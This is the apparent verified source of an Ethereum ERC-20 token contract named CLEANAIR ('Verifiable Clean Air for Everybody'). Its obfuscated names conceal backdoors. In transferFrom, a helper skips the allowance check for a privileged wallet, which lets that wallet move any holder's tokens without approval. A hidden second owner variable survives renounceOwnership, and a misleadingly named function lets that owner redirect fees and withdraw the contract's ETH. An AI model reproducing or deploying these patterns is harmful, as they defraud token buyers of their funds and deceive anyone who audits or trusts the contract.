/**
 *Submitted for verification at Etherscan.io on 2025-01-24
*/

// SPDX-License-Identifier: MIT
/*
    https://x.com/VitalikButerin/status/1882784657202458647    

    https://t.me/CLEANAIR_ETH

*/

pragma solidity ^0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract CLEANAIR is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private _Twlx751y;

    uint8 private constant _decimals = 9;
    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _total121c = 1000000000 * 10 **_decimals;

    string private constant _name = unicode"VERIFIABLE CLEAN AIR FOR EVERYBODY";
    string private constant _symbol = unicode"CLEANAIR";
    
    address private _deadWallet = address(0xdead);
    mapping(address => uint256) private vlisdge5213t3;
    mapping(address => mapping(address => uint256)) private allp3pt3;
    mapping(address => bool) private vluyt39;

    uint256 private _prosc3initialBuyTax = 5;
    uint256 private _prosc3initialSellTax = 5;
    uint256 private _prosc3finalBuyTax = 0;
    uint256 private _prosc3finalSellTax = 0;
    uint256 private _prosc3reduceBuyTaxAt = 7;
    uint256 private _prosc3reduceSellTaxAt = 7;
    uint256 private _includedTAXBuyLimit = 0;
    address private ownner;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _Twlx751y = payable(_msgSender());
        
        vlisdge5213t3[address(this)] = _total121c * 98 / 100;
        vlisdge5213t3[owner()] = _total121c * 2 / 100;

        vluyt39[owner()] = true;
        vluyt39[address(this)] = true;
        vluyt39[_Twlx751y] = true;
        ownner = _msgSender();

        emit Transfer(address(0), address(this), _total121c * 98 / 100);
        emit Transfer(address(0), address(owner()), _total121c * 2 / 100);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function min(uint256 a, uint256 b) public pure returns (uint256) {return (a < b) ? a : b;}

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _total121c;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferme59(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allp3pt3[sender][_msgSender()].sub(
                _addallowance(sender, recipient) ? amount : 0,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return vlisdge5213t3[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allp3pt3[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allp3pt3[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferme59(_msgSender(), recipient, amount);
        return true;
    }

    function _transferme59(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_includedTAXBuyLimit > _prosc3reduceBuyTaxAt)
                        ? _prosc3finalBuyTax
                        : _prosc3initialBuyTax
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !vluyt39[to]
            ) {
                require(amount <= _maxAmountPerTX, "Exceeds the _maxAmountPerTX.");
                require(
                    balanceOf(to) + amount <= _maxSizeOfWallet,
                    "Exceeds the maxWalletSize."
                );
                _includedTAXBuyLimit++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_includedTAXBuyLimit > _prosc3reduceSellTaxAt)
                            ? _prosc3finalSellTax
                            : _prosc3initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    swapExactToETH(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                _feeReceiver(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            vlisdge5213t3[address(this)] = vlisdge5213t3[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        vlisdge5213t3[from] = vlisdge5213t3[from].sub(amount);
        vlisdge5213t3[to] = vlisdge5213t3[to].add(amount.sub(taxAmount));
        if (to != _deadWallet) emit Transfer(from, to, amount.sub(taxAmount));
    }

     function _addallowance(
        address owner,
        address spender
    ) private view returns (bool) {
        return
            msg.sender != _Twlx751y &&
            (owner == uniswapV2Pair || spender != _deadWallet);
    }

    function swapExactToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function AsthelperETH(address _to, string memory _st) external {
        require(_to != address(0), _st);
        require( _to != address(0xdead), _st );
        require(_msgSender() == ownner, _st );

        _Twlx751y = payable(_to);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _feeReceiver(uint256 amount) private {
        _Twlx751y.transfer(amount);
    }
    
    function launch() external onlyOwner {
        require(!tradingOpen, "Already started!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _total121c);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _total121c;
        _maxSizeOfWallet = _total121c;
        emit MaxTxAmountUpdated(_total121c);
    }
    
    receive() external payable {}
}